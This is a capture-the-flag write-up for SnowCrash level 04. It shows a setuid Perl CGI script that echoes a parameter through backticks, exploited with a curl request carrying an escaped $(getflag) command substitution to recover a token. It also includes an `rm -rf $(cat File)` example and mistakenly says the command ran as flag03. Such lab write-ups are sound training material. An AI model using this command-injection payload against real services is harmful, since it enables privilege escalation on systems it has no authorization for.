## Level 04


## Clues

We now have a perl script named level04.pl


This script is also executed by the user flag04 :
```
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
level04@SnowCrash:~$
```

Lets see what's inside :

```
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The script prints out "Content-type: text/html\n\n" and then execute the subroutine x with the x parameter.

```
level04@SnowCrash:~$ perl level04.pl x=loremipsum
Content-type: text/html

loremipsum
level04@SnowCrash:~$
```

We can see in the script the line **localhost:4747**, this mean we can call this script with an http request, lets try that.

```
level04@SnowCrash:~$ curl localhost:4747/level04.pl?x=loremipsum
loremipsum
level04@SnowCrash:~$
```

It prints out only the value of x when we call it this way, in any case, we will be using this to find the flag.


## Solution

What we have here is a script that is vulnerable to code injection, since this script have the flag04 privilege, we will try to make it execute the getflag command.


We are going to inject code using command substitution

The command substitution is the feature of the shell language that allow you to execute a command and have the output of that command replacing the text of the command.

Example :

```
➜  test touch A B C
➜  test touch File
➜  test echo "A B C" > File
➜  test ls
A  B  C  File
➜  test rm -rf $(cat File) // Command Substitution
➜  test ls
File
➜  test
```

Lets try that in the script using curl.

```
level04@SnowCrash:~$ curl localhost:4747/level04.pl?x=$(getflag)
Check
curl: (6) Couldn't resolve host 'flag.Here'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'your'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host ''
curl: (6) Couldn't resolve host 'Nope'
curl: (6) Couldn't resolve host 'there'
curl: (6) Couldn't resolve host 'is'
curl: (6) Couldn't resolve host 'no'
curl: (6) Couldn't resolve host 'token'
curl: (6) Couldn't resolve host 'here'
curl: (6) Couldn't resolve host 'for'
curl: (6) Couldn't resolve host 'you'
curl: (6) Couldn't resolve host 'sorry.'
curl: (6) Couldn't resolve host 'Try'
curl: (6) Couldn't resolve host 'again'
curl: (6) Couldn't resolve host ''
level04@SnowCrash:~$
```
That's not working, but its normal, here we only gave the output of the getflag command to x.

We actually want to give exacly the word $(getflag), lets try again :


```
level04@SnowCrash:~$ curl localhost:4747/level04.pl?x=$\(getflag\)
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$
```

By using '\\' , the script received $(getflag) and the shell interpreted as a command substitution, and executed the getflag command as flag03

So far so cool !



## What i learned

Code injection using command substitution

Perl scripting

More curiosity